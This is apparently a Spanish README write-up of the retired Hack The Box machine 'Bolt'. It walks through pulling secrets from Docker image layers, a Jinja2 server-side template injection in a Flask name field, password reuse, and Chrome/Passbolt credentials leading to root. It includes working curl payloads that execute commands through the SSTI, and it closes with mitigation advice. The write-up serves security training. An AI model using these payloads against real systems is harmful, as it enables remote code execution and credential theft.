---
machine: Bolt
os: Linux
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [linux, docker, ssti, passbolt, chrome]
---

# Bolt — Hack The Box (Linux)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

Un backup de la aplicación incluye capas de una imagen Docker con código y secretos. Esos datos permiten explotar una SSTI en Flask; la reutilización de contraseñas lleva a un perfil de Chrome y a Passbolt, cuyo flujo de recuperación da root.

## Reconocimiento

```bash
nmap -Pn -sCV -p22,80,443 <IP>
# Extraer capas de la imagen
mkdir layers && tar -xf backup.tar -C layers
find layers -name ".env" -o -name "*.py" | head
# SSTI
curl -s "http://bolt.htb/" --data-urlencode "name={{7*7}}"
curl -s "http://bolt.htb/" --data-urlencode "name={{cycler.__init__.__globals__.os.popen('id').read()}}"
# Passbolt
ls -la ~/.config/google-chrome/Default/
```

## Enumeración

- Sitio Flask con un campo de nombre y una plantilla Jinja2.
- Backup con capas de imagen Docker y archivos de la aplicación.
- Perfil de Chrome y base de datos de Passbolt en el host.

## Acceso inicial

Se extraen las capas de la imagen y se recuperan el código fuente, `.env` y la clave de sesión. Con el código se identifica una SSTI en el campo de nombre; se inyecta una expresión Jinja2 y se obtiene una shell.

## Escalada de privilegios

Las contraseñas del `.env` se reutilizan para SSH. El perfil de Chrome guarda credenciales de Passbolt; la base y la clave PGP permiten usar el flujo de recuperación y ejecutar como root.

## Evidencia

- Capas Docker con `.env` y código Flask.
- Render de `{{ 7*7 }}` y ejecución de `id`.
- Credenciales de Passbolt y shell de root.

## Lecciones aprendidas

- Las imágenes Docker contienen capas eliminadas y secretos.
- Una plantilla Jinja2 con entrada del usuario es SSTI.
- Passbolt y los perfiles de navegador son objetivos de alto valor.

## Mitigación y detección

- Limpiar secretos de las imágenes y usar `docker history`/`dive`.
- No renderizar plantillas con entrada del usuario.
- Rotar contraseñas y proteger perfiles y bases de Passbolt.

## Referencias

- [0xdf — Bolt](https://0xdf.gitlab.io/2022/02/19/htb-bolt.html)
- [Docker — Image layers](https://docs.docker.com/storage/storagedriver/)
- [Hack The Box — Bolt](https://app.hackthebox.com/machines/bolt)
